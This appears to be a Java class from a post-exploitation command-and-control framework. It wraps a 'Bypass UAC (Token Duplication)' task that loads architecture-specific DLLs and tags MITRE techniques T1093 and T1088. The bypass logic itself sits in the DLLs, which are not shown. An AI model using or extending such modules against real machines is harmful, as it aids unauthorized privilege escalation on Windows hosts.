package beacon.jobs;

import beacon.JobSimple;
import beacon.TaskBeacon;
import common.Packer;

public class BypassUACTokenJob
        extends JobSimple {
    protected String args;
    protected String desc;
    protected String arch;

    public BypassUACTokenJob(TaskBeacon tasker, String args, String desc, String arch) {
        super(tasker);
        this.args = args;
        this.desc = desc;
        this.arch = arch;
    }

    @Override
    public String getDescription() {
        return this.desc;
    }

    @Override
    public String getTactic() {
        return "T1093, T1088";
    }

    @Override
    public String getShortDescription() {
        return "Bypass UAC (Token Duplication)";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x86")) {
            return "resources/bypassuactoken.dll";
        }
        return "resources/bypassuactoken.x64.dll";
    }

    @Override
    public int getWaitTime() {
        return 20000;
    }

    @Override
    public byte[] getArgument() {
        Packer packer = new Packer();
        packer.addWideString(this.args + '\u0000');
        return packer.getBytes();
    }
}

